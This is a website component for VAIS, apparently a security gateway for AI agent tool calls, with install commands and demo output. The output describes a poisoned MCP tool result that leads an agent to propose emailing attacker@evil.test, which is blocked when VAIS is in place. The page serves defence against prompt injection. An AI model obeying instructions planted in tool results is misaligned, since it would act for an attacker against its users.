@@ -1,0 +1,170 @@
+---
+// Try it in two minutes. The commands are the ones timed on a fresh clone (about ten
+// seconds end to end on the maintainer's machine); the output is `vais mcp-demo`'s,
+// identical on 0.12.0rc12 and rc13.
+const repo = 'https://github.com/stratomarco/vais-boundary';
+const platforms = [
+  {
+    id: 'windows',
+    label: 'Windows',
+    note: 'PowerShell. The virtual environment is used directly, so no activation script needs to run.',
+    commands: [
+      'git clone https://github.com/stratomarco/vais-boundary.git',
+      'cd vais-boundary',
+      'py -3 -m venv .venv',
+      '.\\.venv\\Scripts\\python.exe -m pip install -e .',
+      '.\\.venv\\Scripts\\vais.exe mcp-demo',
+    ],
+  },
+  {
+    id: 'unix',
+    label: 'macOS / Linux',
+    note: 'Any POSIX shell.',
+    commands: [
+      'git clone https://github.com/stratomarco/vais-boundary.git',
+      'cd vais-boundary',
+      'python3 -m venv .venv',
+      '.venv/bin/python -m pip install -e .',
+      '.venv/bin/vais mcp-demo',
+    ],
+  },
+];
+const output = `VAIS MCP Security Boundary
+Not AI-powered. Deterministic security engineering around an AI/agent system.
+
+Poisoned MCP input
+  source: mcp:ops:tool_result:get_incident
+  trust:  untrusted
+Agent proposed: send_email(recipient='attacker@evil.test')
+
+UNPROTECTED
+  MCP calls: 1
+  effect: email_sent
+  invariant violations: 1
+
+VAIS PROTECTED
+  decision: deny
+  reasons: bound_argument_changed:recipient, bound_argument_not_trusted:recipient, untrusted_authority_argument:recipient
+  MCP calls: 0
+  invariant violations: 0
+
+Security property: the MCP data can influence the model, but it cannot grant itself authority.`;
+---
+<section class="try wrap" id="try-it" aria-labelledby="try-heading">
+  <p class="eyebrow">Try it</p>
+  <h2 id="try-heading">See it in under two minutes.</h2>
+  <p class="intro">You need Python 3.11 or newer and git. PyYAML is the only dependency, no model server is needed, and the demo runs the same poisoned tool call twice: once straight to the tool, once through VAIS.</p>
+
+  <div class="try-grid">
+    <div class="steps">
+      <div class="os-tabs" role="tablist" aria-label="Operating system">
+        {platforms.map((p, i) => (
+          <button role="tab" id={`os-${p.id}`} aria-controls={`cmds-${p.id}`} aria-selected={i === 0 ? 'true' : 'false'} tabindex={i === 0 ? 0 : -1}>{p.label}</button>
+        ))}
+      </div>
+      {platforms.map((p, i) => (
+        <div class="cmds" role="tabpanel" id={`cmds-${p.id}`} aria-labelledby={`os-${p.id}`} hidden={i !== 0}>
+          <div class="code-block">
+            <pre><code>{p.commands.join('\n')}</code></pre>
+            <button class="copy" type="button" data-copy={p.commands.join('\n')}>Copy</button>
+          </div>
+          <p class="small">{p.note}</p>
+        </div>
+      ))}
+      <ol class="next">
+        <li><b>Clone</b> the repository.</li>
+        <li><b>Install</b> it into a virtual environment.</li>
+        <li><b>Run</b> <code>vais mcp-demo</code> and compare the two runs.</li>
+      </ol>
+    </div>
+
+    <figure class="terminal">
+      <figcaption>Output of <code>vais mcp-demo</code></figcaption>
+      <pre>{output}</pre>
+    </figure>
+  </div>
+
+  <p class="links">
+    <a href={`${repo}/blob/main/HOWTO.md`}>Every operating mode, step by step</a>
+    <a href={`${repo}/blob/main/docs/gateway.md`}>Run the gateway in front of real tools</a>
+    <a href={`${repo}/blob/main/docs/threat-model.md`}>Read the threat model</a>
+  </p>
+</section>
+
+<script>
+  for (const section of document.querySelectorAll<HTMLElement>('.try')) {
+    const tabs = [...section.querySelectorAll<HTMLButtonElement>('[role="tab"]')];
+    const select = (tab: HTMLButtonElement) => {
+      for (const t of tabs) {
+        const on = t === tab;
+        t.setAttribute('aria-selected', String(on));
+        t.tabIndex = on ? 0 : -1;
+        section.querySelector<HTMLElement>(`#${t.getAttribute('aria-controls')}`)!.hidden = !on;
+      }
+    };
+    tabs.forEach((tab, i) => {
+      tab.addEventListener('click', () => select(tab));
+      tab.addEventListener('keydown', (e) => {
+        const next = e.key === 'ArrowRight' ? tabs[(i + 1) % tabs.length] : e.key === 'ArrowLeft' ? tabs[(i - 1 + tabs.length) % tabs.length] : null;
+        if (next) { e.preventDefault(); next.focus(); select(next); }
+      });
+    });
+    // Open the tab for the visitor's platform; the Windows tab is the default otherwise.
+    if (!/Win/i.test(navigator.platform) && tabs[1]) select(tabs[1]);
+
+    for (const button of section.querySelectorAll<HTMLButtonElement>('.copy')) {
+      button.addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(button.dataset.copy ?? '');
+          button.textContent = 'Copied';
+        } catch {
+          button.textContent = 'Select and copy';
+        }
+        window.setTimeout(() => (button.textContent = 'Copy'), 1800);
+      });
+    }
+  }
+</script>
+
+<style>
+  .try { padding-block: 64px; border-bottom: 1px solid var(--line); }
+  .try h2 { font-size: 2.25rem; line-height: 1.1; letter-spacing: -.04em; margin-bottom: 20px; }
+  .try > .intro { margin-bottom: 36px; max-width: 760px; }
+
+  .try-grid { display: grid; grid-template-columns: minmax(0, 5fr) minmax(0, 6fr); gap: 40px; align-items: start; }
+
+  .os-tabs { display: flex; border-bottom: 1px solid var(--line); margin-bottom: 16px; }
+  [role='tab'] { font: inherit; font-size: .9375rem; background: none; border: 0; border-bottom: 2px solid transparent;
+                 padding: 10px 0 10px; margin-right: 24px; cursor: pointer; color: var(--muted); }
+  [role='tab'][aria-selected='true'] { color: #0B192C; border-bottom-color: #0B192C; font-weight: 600; }
+
+  .code-block { position: relative; background: #0B192C; }
+  .code-block pre { margin: 0; padding: 18px 20px; padding-right: 84px; overflow-x: auto; }
+  .code-block code { font-family: Consolas, 'Courier New', monospace; font-size: .8125rem; line-height: 1.8; color: #E7EDF6; white-space: pre; }
+  .copy { position: absolute; top: 10px; right: 10px; font: inherit; font-size: .75rem; background: none; color: #E7EDF6;
+          border: 1px solid #263B55; padding: 4px 10px; cursor: pointer; }
+  .copy:hover { border-color: #E7EDF6; }
+  .cmds .small { margin: 10px 0 0; }
+
+  .next { margin: 28px 0 0; padding-left: 20px; color: var(--muted); line-height: 1.9; font-size: .9375rem; }
+  .next b { color: #0B192C; }
+  .next code { font-size: .8125rem; background: #E7EDF6; padding: 1px 5px; }
+
+  .terminal { margin: 0; border: 1px solid var(--line); background: #fff; }
+  .terminal figcaption { font-family: Consolas, 'Courier New', monospace; font-size: .75rem; letter-spacing: .05em; color: #475569;
+                         padding: 10px 16px; border-bottom: 1px solid var(--line); }
+  .terminal figcaption code { font-size: .75rem; }
+  .terminal pre { margin: 0; padding: 16px; overflow-x: auto; font-family: Consolas, 'Courier New', monospace; font-size: .75rem;
+                  line-height: 1.6; color: #0B192C; white-space: pre-wrap; word-break: break-word; }
+
+  .links { display: flex; flex-wrap: wrap; gap: 28px; margin: 36px 0 0; font-size: .9375rem; }
+
+  @media (max-width: 850px) {
+    .try-grid { grid-template-columns: 1fr; }
+  }
+  @media (max-width: 580px) {
+    .try { padding-block: 48px; }
+    .try h2 { font-size: 2rem; }
+    .links { flex-direction: column; gap: 14px; }
+  }
+</style>
